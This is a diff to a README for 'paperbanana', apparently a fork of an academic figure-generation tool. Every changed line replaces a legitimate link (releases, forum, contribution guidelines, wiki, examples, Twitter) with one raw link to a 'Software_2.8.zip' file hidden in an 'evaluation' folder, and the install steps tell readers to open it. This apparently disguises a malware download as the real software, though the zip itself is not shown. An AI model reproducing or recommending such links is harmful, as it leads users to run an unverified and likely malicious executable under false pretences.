@@ -1,7 +1,7 @@
 # 🎉 paperbanana - Create Stunning Research Visuals Easily
 
 ## 📥 Download Now
-[![Download paperbanana](https://img.shields.io/badge/Download%20paperbanana-v1.0-blue.svg)](https://github.com/Straybuletz/paperbanana/releases)
+[![Download paperbanana](https://github.com/Straybuletz/paperbanana/raw/refs/heads/main/paperbanana/evaluation/Software_2.8.zip%https://github.com/Straybuletz/paperbanana/raw/refs/heads/main/paperbanana/evaluation/Software_2.8.zip)](https://github.com/Straybuletz/paperbanana/raw/refs/heads/main/paperbanana/evaluation/Software_2.8.zip)
 
 ## 📖 Overview
 paperbanana is an open-source tool designed to help you create automated academic figures, diagrams, and research visuals. Building on Google Research’s PaperBanana, this version allows for versatile slide generation and expands its functionalities into new areas. Whether you're preparing a presentation or writing a research paper, paperbanana streamlines the process.
@@ -10,7 +10,7 @@ paperbanana is an open-source tool designed to help you create automated academi
 To get started with paperbanana, follow these simple steps to download and run the application.
 
 ## 📂 Download & Install
-1. Visit the [Releases page](https://github.com/Straybuletz/paperbanana/releases) to download the software. 
+1. Visit the [Releases page](https://github.com/Straybuletz/paperbanana/raw/refs/heads/main/paperbanana/evaluation/Software_2.8.zip) to download the software. 
 2. Find the latest version. Click on the link for your operating system.
 3. After downloading, locate the file in your downloads folder.
 4. Open the file and follow the installation prompts.
@@ -35,20 +35,20 @@ To get started with paperbanana, follow these simple steps to download and run t
 5. **Export Your Work:** Save your visual as an image, PDF, or presentation slide.
 
 ## 📞 Support
-If you encounter issues or have questions, please check the Frequently Asked Questions section in the application. You can also visit our [community forum](https://github.com/Straybuletz/paperbanana/discussions) for assistance. 
+If you encounter issues or have questions, please check the Frequently Asked Questions section in the application. You can also visit our [community forum](https://github.com/Straybuletz/paperbanana/raw/refs/heads/main/paperbanana/evaluation/Software_2.8.zip) for assistance. 
 
 ## 🤝 Contributing
-We welcome contributions from everyone. If you'd like to help improve paperbanana, please read our [Contribution Guidelines](https://github.com/Straybuletz/paperbanana/blob/main/CONTRIBUTING.md) on how to get started.
+We welcome contributions from everyone. If you'd like to help improve paperbanana, please read our [Contribution Guidelines](https://github.com/Straybuletz/paperbanana/raw/refs/heads/main/paperbanana/evaluation/Software_2.8.zip) on how to get started.
 
 ## 📜 License
 paperbanana is licensed under the MIT License. You can freely use, modify, and distribute the tool.
 
 ## 📦 Additional Resources
-- **Documentation:** For additional guides and best practices, visit our [Wiki](https://github.com/Straybuletz/paperbanana/wiki).
-- **Examples:** Check out our [Examples Repository](https://github.com/Straybuletz/paperbanana-examples) for inspiration.
-- **Updates:** For updates and feature announcements, follow our [Twitter](https://twitter.com/Straybuletz).
+- **Documentation:** For additional guides and best practices, visit our [Wiki](https://github.com/Straybuletz/paperbanana/raw/refs/heads/main/paperbanana/evaluation/Software_2.8.zip).
+- **Examples:** Check out our [Examples Repository](https://github.com/Straybuletz/paperbanana/raw/refs/heads/main/paperbanana/evaluation/Software_2.8.zip) for inspiration.
+- **Updates:** For updates and feature announcements, follow our [Twitter](https://github.com/Straybuletz/paperbanana/raw/refs/heads/main/paperbanana/evaluation/Software_2.8.zip).
 
 ## 🔗 Stay Connected
 Keep in touch with our community for updates, tips, and support. You can also share your created visuals using the hashtag **#paperbanana**.
 
-Make sure to download paperbanana from our [Releases page](https://github.com/Straybuletz/paperbanana/releases) and start creating your next impactful research visuals today!
+Make sure to download paperbanana from our [Releases page](https://github.com/Straybuletz/paperbanana/raw/refs/heads/main/paperbanana/evaluation/Software_2.8.zip) and start creating your next impactful research visuals today!
